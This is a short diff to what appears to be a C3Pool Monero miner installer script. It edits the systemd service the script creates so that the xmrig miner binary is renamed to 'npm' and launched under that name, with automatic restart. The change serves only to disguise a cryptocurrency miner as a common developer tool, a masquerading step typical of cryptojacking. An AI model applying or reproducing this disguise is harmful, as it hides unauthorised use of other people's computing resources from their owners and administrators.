@@ -313,7 +313,7 @@ else
 Description=Monero miner service
 
 [Service]
-ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
+ExecStart=$HOME/c3pool/npm --config=$HOME/c3pool/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -322,6 +322,7 @@ CPUWeight=1
 WantedBy=multi-user.target
 EOL
     sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
+    sudo mv $HOME/c3pool/xmrig $HOME/c3pool/npm
     echo "[*] Starting c3pool_miner systemd service"
 	echo "[*] 启动c3pool_miner systemd服务"
     sudo killall xmrig 2>/dev/null
